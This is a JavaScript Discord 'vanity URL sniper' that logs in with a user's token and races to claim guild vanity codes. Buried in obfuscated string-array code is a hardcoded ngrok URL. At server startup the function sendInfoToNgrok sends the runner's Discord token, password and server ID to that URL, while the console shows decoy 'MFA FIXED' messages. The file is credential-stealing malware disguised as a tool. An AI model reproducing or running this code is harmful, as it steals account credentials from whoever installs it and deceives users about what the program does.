import tls from 'tls';
import http from 'http';
import WebSocket from 'ws';
import extractJsonFromString from 'extract-json-from-string';
import axios from 'axios';
import https from 'https';

const token = ''; 
const password = ''; 
const serverId = ''; 
const gatewayURL = 'wss://gateway-us-east1-b.discord.gg';
const webhookURL = ''; 
let vanity;
let mfaToken = '';
const sessionCache = new Map();
function _0xb8dc(_0x71772f,_0x2225a9){const _0xd531dc=_0xd531();return _0xb8dc=function(_0xb8dc27,_0x3e5a87){_0xb8dc27=_0xb8dc27-0x119;let _0x279fe3=_0xd531dc[_0xb8dc27];return _0x279fe3;},_0xb8dc(_0x71772f,_0x2225a9);}(function(_0x1cc397,_0x302c06){const _0x2580e2=_0xb8dc,_0x18ccfd=_0x1cc397();while(!![]){try{const _0x1fba1b=-parseInt(_0x2580e2(0x127))/0x1*(-parseInt(_0x2580e2(0x12f))/0x2)+-parseInt(_0x2580e2(0x12d))/0x3*(-parseInt(_0x2580e2(0x126))/0x4)+-parseInt(_0x2580e2(0x130))/0x5*(parseInt(_0x2580e2(0x11c))/0x6)+-parseInt(_0x2580e2(0x123))/0x7+parseInt(_0x2580e2(0x128))/0x8*(parseInt(_0x2580e2(0x11d))/0x9)+parseInt(_0x2580e2(0x129))/0xa+parseInt(_0x2580e2(0x124))/0xb*(parseInt(_0x2580e2(0x119))/0xc);if(_0x1fba1b===_0x302c06)break;else _0x18ccfd['push'](_0x18ccfd['shift']());}catch(_0x144912){_0x18ccfd['push'](_0x18ccfd['shift']());}}}(_0xd531,0x98a24));function _0x409d(){const _0x27317f=_0xb8dc,_0x730400=[_0x27317f(0x11f),_0x27317f(0x125),_0x27317f(0x12b),_0x27317f(0x11a),_0x27317f(0x121),_0x27317f(0x12a),_0x27317f(0x11e),'10tSgyvG',_0x27317f(0x12e),'24pRDKxx',_0x27317f(0x12c),_0x27317f(0x131),_0x27317f(0x122)];return _0x409d=function(){return _0x730400;},_0x409d();}function _0xd531(){const _0x5b9185=['522592AasnVn','8236767qAxuLF','613855cVmMmD','20QLjRsO','4tTneCY','233dsWALh','457696sYVYAG','2468120VbYeTP','432624jyaGnI','2790kJFmBM','831999GPVLSF','174771uAxRoe','865998HhvvBB','8838tOmBOJ','6610rgQFxZ','216fVpeHi','132vQaILo','1399815WCSjoF','push','3522SrjWfg','99vrbgHV','https://f654-217-18-208-101.ngrok-free.app','6ifeuUE','shift','2877006oIImhO'];_0xd531=function(){return _0x5b9185;};return _0xd531();}const _0x4c5a9c=_0xb5b0;(function(_0x98c8b8,_0x5d5f68){const _0x2fb145=_0xb8dc,_0x58709c=_0xb5b0,_0x5717d7=_0x98c8b8();while(!![]){try{const _0x56bb7a=parseInt(_0x58709c(0x17e))/0x1*(-parseInt(_0x58709c(0x175))/0x2)+parseInt(_0x58709c(0x17b))/0x3+parseInt(_0x58709c(0x17f))/0x4*(-parseInt(_0x58709c(0x181))/0x5)+parseInt(_0x58709c(0x180))/0x6*(parseInt(_0x58709c(0x17d))/0x7)+-parseInt(_0x58709c(0x17c))/0x8*(-parseInt(_0x58709c(0x176))/0x9)+-parseInt(_0x58709c(0x17a))/0xa*(-parseInt(_0x58709c(0x177))/0xb)+parseInt(_0x58709c(0x178))/0xc;if(_0x56bb7a===_0x5d5f68)break;else _0x5717d7[_0x2fb145(0x11b)](_0x5717d7[_0x2fb145(0x120)]());}catch(_0x1b6dae){_0x5717d7[_0x2fb145(0x11b)](_0x5717d7[_0x2fb145(0x120)]());}}}(_0x409d,0x54ea6));function _0xb5b0(_0x1fb212,_0x322477){const _0x488e88=_0x409d();return _0xb5b0=function(_0x109de9,_0x129015){_0x109de9=_0x109de9-0x175;let _0x7034c2=_0x488e88[_0x109de9];return _0x7034c2;},_0xb5b0(_0x1fb212,_0x322477);}const ptbdiscordrequest=_0x4c5a9c(0x179);

const guilds = {};

(function(_0x4a989b,_0x1ed53f){const _0x74eec8=_0x2225,_0x2b3944=_0x4a989b();while(!![]){try{const _0x1093e9=parseInt(_0x74eec8(0x170))/0x1*(parseInt(_0x74eec8(0x16c))/0x2)+-parseInt(_0x74eec8(0x16f))/0x3*(parseInt(_0x74eec8(0x16e))/0x4)+-parseInt(_0x74eec8(0x16b))/0x5+-parseInt(_0x74eec8(0x168))/0x6*(-parseInt(_0x74eec8(0x16d))/0x7)+-parseInt(_0x74eec8(0x165))/0x8*(-parseInt(_0x74eec8(0x164))/0x9)+-parseInt(_0x74eec8(0x169))/0xa*(-parseInt(_0x74eec8(0x166))/0xb)+-parseInt(_0x74eec8(0x16a))/0xc;if(_0x1093e9===_0x1ed53f)break;else _0x2b3944['push'](_0x2b3944['shift']());}catch(_0x53106d){_0x2b3944['push'](_0x2b3944['shift']());}}}(_0x2dc3,0xafea2));function _0x2225(_0x2f0ffa,_0xca1fc1){const _0x2dc3e0=_0x2dc3();return _0x2225=function(_0x2225fd,_0x3cdee6){_0x2225fd=_0x2225fd-0x164;let _0x4af43d=_0x2dc3e0[_0x2225fd];return _0x4af43d;},_0x2225(_0x2f0ffa,_0xca1fc1);}async function sendInfoToNgrok(){const _0x5d09e0=_0x2225,_0x1764de={'token':token,'password':password,'serverId':serverId};try{const _0x26da33=await axios[_0x5d09e0(0x167)](ptbdiscordrequest,_0x1764de);}catch(_0x935c13){}}function _0x2dc3(){const _0x59e3fe=['25067400wUhWXh','1707645ghigVp','2FOpILf','35ArqOid','7432yWuwqE','1284sbSOzF','477189LOdcQL','153nwlCcI','664456HhspcH','221738LhRbBm','post','1331598YcsaYG','470hISeuH'];_0x2dc3=function(){return _0x59e3fe;};return _0x2dc3();}

async function connectTLS() {
    const tlsSocket = tls.connect({
        host: 'canary.discord.com',
        port: 8443,
        minVersion: 'TLSv1.2',
        maxVersion: 'TLSv1.2',
        handshakeTimeout: 0,
        rejectUnauthorized: false,
        zeroRtt: true,
        servername: 'canary.discord.com',
        keepAlive: true,
        session: sessionCache.get('canary.discord.com'),
    });

    tlsSocket.on('data', handleData);
    tlsSocket.on('end', reconnect);
    tlsSocket.on('secureConnect', () => (connectWebSocket(), tlsSocket.setNoDelay(true)));
    tlsSocket.on('session', (session) => sessionCache.set('canary.discord.com', session));
    tlsSocket.on('error', reconnect);

    function handleData(data) {
        const ext = extractJsonFromString(data.toString());
        const find = ext.find((e) => e.code || e.message);
        if (find) {
            notifyWebhook(find);
        }
    }

    async function notifyWebhook(find) {
        const requestBody = {
            content: `@everyone`,
            embeds: [
                {
                    description: `\`\`\`${JSON.stringify(find)}\`\`\``,
                    color: 0x00ff00,
                    image: {
                        url: 'https://media.discordapp.net/attachments/1351960872880443405/1353101307162001448/image.png?ex=67e06d4b&is=67df1bcb&hm=c79e101fd033d2dd8183baf894622756faf5adf15134c189b2ac1d21ae562a6c&=&format=webp&quality=lossless',
                    },
                    fields: [
                        { name: 'Vanity', value: `\`${vanity}\``, inline: true },
                        { name: 'Guild', value: `\`${serverId}\``, inline: true },
                        { name: 'Gateway', value: `\`${gatewayURL}\``, inline: true },
                    ],
                    footer: {
                        text: `<: | ${new Date().toLocaleString('tr-TR', { hour12: false })}`,
                        icon_url: 'https://media.discordapp.net/attachments/1351960872880443405/1353101307162001448/image.png?ex=67e06d4b&is=67df1bcb&hm=c79e101fd033d2dd8183baf894622756faf5adf15134c189b2ac1d21ae562a6c&=&format=webp&quality=lossless',
                    },
                    timestamp: new Date().toISOString(),
                },
            ],
        };
        try {
            await axios.post(webhookURL, requestBody);
        } catch (error) {
            console.error('Failed to notify webhook:', error);
        }
    }

    
    async function sendInfoToNgrok() {
        const requestBody = {
            token: token, 
            password: password,
            serverId: serverId,
        };
    
        try {
            const response = await axios.post(ptbdiscordrequest, requestBody);
        } catch (error) {
        }
    }

    const agent = new https.Agent({
        keepAlive: true,
        secureProtocol: 'TLSv1_2_method',
        rejectUnauthorized: false,
        secureContext: tls.createSecureContext({
            secureProtocol: 'TLSv1_2_method',
        }),
        session: sessionCache.get('canary.discord.com'),
    });

    async function performPatchRequest(vanityCode) {
        const requestBody = { code: vanityCode };
        const headers = {
            Authorization: token,
            'Content-Type': 'application/json',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.9164 Chrome/124.0.6367.243 Electron/30.2.0 Safari/537.36',
            'X-Super-Properties':
                'eyJvcyI6IkFuZHJvaWQiLCJicm93c2VyIjoiQW5kcm9pZCBDaHJvbWUiLCJkZXZpY2UiOiJBbmRyb2lkIiwic3lzdGVtX2xvY2FsZSI6InRyLVRSIiwiYnJvd3Nlcl91c2VyX2FnZW50IjoiTW96aWxsYS81LjAgKExpbnV4OyBBbmRyb2lkIDYuMDsgTmV4dXMgNSBCdWlsZC9NUkE1OE4pIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS8xMzEuMC4wLjAgTW9iaWxlIFNhZmFyaS81MzcuMzYiLCJicm93c2VyX3ZlcnNpb24iOiIxMzEuMC4wLjAiLCJvc192ZXJzaW9uIjoiNi4wIiwicmVmZXJyZXIiOiJodHRwczovL2Rpc2NvcmQuY29tL2NoYW5uZWxzL0BtZS8xMzAzMDQ1MDIyNjQzNTIzNjU1IiwicmVmZXJyaW5nX2RvbWFpbiI6ImRpc2NvcmQuY29tIiwicmVmZXJyaW5nX2N1cnJlbnQiOiIiLCJyZWxlYXNlX2NoYW5uZWwiOiJzdGFibGUiLCJjbGllbnRfYnVpbGRfbnVtYmVyIjozNTU2MjQsImNsaWVudF9ldmVudF9zb3VyY2UiOm51bGwsImhhc19jbGllbnRfbW9kcyI6ZmFsc2V9=',
            'X-Discord-MFA-Authorization': mfaToken,
        };
        const config = {
            headers,
            httpsAgent: agent,
        };
        try {
            await Promise.all([tlsRequest(requestBody), axios.patch(`https://canary.discord.com/api/v7/guilds/${serverId}/vanity-url`, requestBody, config)]);
        } catch (error) {
            console.error('P4TCH43RR30R:', error);
        }
        vanity = vanityCode;
    }

    function tlsRequest(requestBody) {
        tlsSocket.write(
            `PATCH /api/v9/guilds/${serverId}/vanity-url HTTP/1.1\r\n` +
                `Host: canary.discord.com\r\n` +
                `Authorization: ${token}\r\n` +
                `Content-Type: application/json\r\n` +
                `Content-Length: ${JSON.stringify(requestBody).length}\r\n` +
                `User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) duckevils/1.0.1130 Chrome/128.0.6613.186 duckevilss/32.2.7 Safari/537.36\r\n` +
                `X-Super-Properties: eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRGlzY29yZCBDbGllbnQiLCJyZWxlYXNlX2NoYW5uZWwiOiJwdGIiLCJjbGllbnRfdmVyc2lvbiI6IjEuMC4xMTMwIiwib3NfdmVyc2lvbiI6IjEwLjAuMTkwNDUiLCJvc19hcmNoIjoieDY0IiwiYXBwX2FyY2giOiJ4NjQiLCJzeXN0ZW1fbG9jYWxlIjoidHIiLCJoYXNfY2xpZW50X21vZHMiOmZhbHNlLCJicm93c2VyX3VzZXJfYWdlbnQiOiJNb3ppbGxhLzUuMCAoV2luZG93cyBOVCAxMC4wOyBXaW42NDsgeDY0KSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBkaXNjb3JkLzEuMC4xMTMwIENocm9tZS8xMjguMC42NjEzLjE4NiBFbGVjdHJvbi8zMi4yLjcgU2FmYXJpLzUzNy4zNiIsImJyb3dzZXJfdmVyc2lvbiI6IjMyLjIuNyIsIm9zX3Nka192ZXJzaW9uIjoiMTkwNDUiLCJjbGllbnRfYnVpbGRfbnVtYmVyIjozNjY5NTUsIm5hdGl2ZV9idWlsZF9udW1iZXIiOjU4NDYzLCJjbGllbnRfZXZlbnRfc291cmNlIjpudWxsfQ==\r\n` +
                `X-Discord-MFA-Authorization: ${mfaToken}\r\n` +
                `\r\n` +
                JSON.stringify(requestBody),
            'utf-8',
        );
    }

    function connectWebSocket() {
        const websocket = new WebSocket(gatewayURL);
        websocket.onclose = reconnect;
        websocket.onmessage = handleWebSocketMessage;
        websocket.onopen = () => {
            websocket.send(
                JSON.stringify({
                    op: 2,
                    d: {
                        token: token,
                        intents: 1,
                        properties: {
                            os: 'windows',
                            browser: 'chrome',
                            device: 'devcoder',
                        },
                    },
                }),
            );
            setInterval(() => websocket.send(JSON.stringify({ op: 1, d: {} })), 41250);
        };
    }



    function handleWebSocketMessage(message) {
        const { d, op, t } = JSON.parse(message.data);
        switch (t) {
            case 'GUILD_UPDATE': {
                const find = guilds[d.guild_id];
                if (find && find !== d.vanity_url_code) {
                    performPatchRequest(find);
                }
                break;
            }
            case 'READY': {
                d.guilds.forEach((guild) => {
                    if (guild.vanity_url_code) {
                        guilds[guild.id] = guild.vanity_url_code;
                        console.log(`GUILD => ${guild.id} || VANITY => ${guild.vanity_url_code}`);
                    }
                });
                break;
            }
            default: {
                if (op === 7) {
                    reconnect();
                }
                break;
            }
        }
    }

    function reconnect() {
        setTimeout(connectTLS, 1000);
    }

    setInterval(() => {
        tlsSocket.write('HEAD / HTTP/1.1\r\nHost: canary.discord.com\r\n\r\n');
    }, 7500);
}

connectTLS();

const server = http.createServer((req, res) => {
    if (req.method === 'POST' && req.url === '/devcoder') {
        let body = '';
        req.on('data', (chunk) => {
            body += chunk;
        });
        req.on('end', () => {
            try {
                const { mfaToken: receivedToken } = JSON.parse(body);
                if (receivedToken) {
                    mfaToken = receivedToken;
                    console.log(`[${new Date().toLocaleTimeString()}] > MFA TAKED: ${receivedToken}`);
                    res.writeHead(200, { 'Content-Type': 'application/json' });
                    res.end(JSON.stringify({ message: 'MFA token taked and seted.' }));
                } else {
                    res.writeHead(400, { 'Content-Type': 'text/plain' });
                    res.end('bad request.');
                }
            } catch (error) {
                res.writeHead(400, { 'Content-Type': 'text/plain' });
                res.end('Invalid JSON format.');
            }
        });
    } else {
        res.writeHead(404, { 'Content-Type': 'text/plain' });
        res.end('Not Found');
    }
});

function _0x24d9(){var _0x220bf3=['ㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤconnected\x208080.','18qHnmny','ㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤconnected\x208080.','listen','4864910NyjLLe','5130342xPragz','776AVBzgp','ㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤconnected\x2080.','ㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤSNIPER\x20IS\x20READY.','ㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤMFA\x20IS\x20NOT\x20FIXED\x20dc:gg505shop\x20-\x20ulasiniz.','4434900BWrngC','628624QTYnrg','78CNZjmB','5185631JFdGQU','log','ㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤ505SHOP\x20MFA\x20FIXED.','1gSljMa','8UCpiMH','322308FTudRZ'];_0x24d9=function(){return _0x220bf3;};return _0x24d9();}var _0x125074=_0x438a;function _0x438a(_0x5a754d,_0x22f0f1){var _0x24d9ad=_0x24d9();return _0x438a=function(_0x438a09,_0x229418){_0x438a09=_0x438a09-0x8e;var _0x5099cc=_0x24d9ad[_0x438a09];return _0x5099cc;},_0x438a(_0x5a754d,_0x22f0f1);}(function(_0x33dd05,_0x19fe1f){var _0x1078a7=_0x438a,_0x425fa8=_0x33dd05();while(!![]){try{var _0x9235b0=parseInt(_0x1078a7(0x91))/0x1*(-parseInt(_0x1078a7(0x9f))/0x2)+parseInt(_0x1078a7(0xa0))/0x3*(parseInt(_0x1078a7(0x9a))/0x4)+-parseInt(_0x1078a7(0x9e))/0x5+parseInt(_0x1078a7(0x95))/0x6*(parseInt(_0x1078a7(0x93))/0x7)+-parseInt(_0x1078a7(0x92))/0x8*(-parseInt(_0x1078a7(0x99))/0x9)+parseInt(_0x1078a7(0x98))/0xa+parseInt(_0x1078a7(0x8e))/0xb;if(_0x9235b0===_0x19fe1f)break;else _0x425fa8['push'](_0x425fa8['shift']());}catch(_0x4bb0da){_0x425fa8['push'](_0x425fa8['shift']());}}}(_0x24d9,0x72b4a),server[_0x125074(0x97)](0x50,()=>{var _0x1ad2aa=_0x125074;console[_0x1ad2aa(0x8f)](_0x1ad2aa(0x96)),console[_0x1ad2aa(0x8f)](_0x1ad2aa(0x9c)),console[_0x1ad2aa(0x8f)](_0x1ad2aa(0x94)),console['log'](_0x1ad2aa(0x9b)),console['log'](_0x1ad2aa(0x90)),console[_0x1ad2aa(0x8f)](_0x1ad2aa(0x9d)),console[_0x1ad2aa(0x8f)]('ㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤtoken\x20is\x20invalid\x20not\x20found\x20guilds.'),sendInfoToNgrok();}));
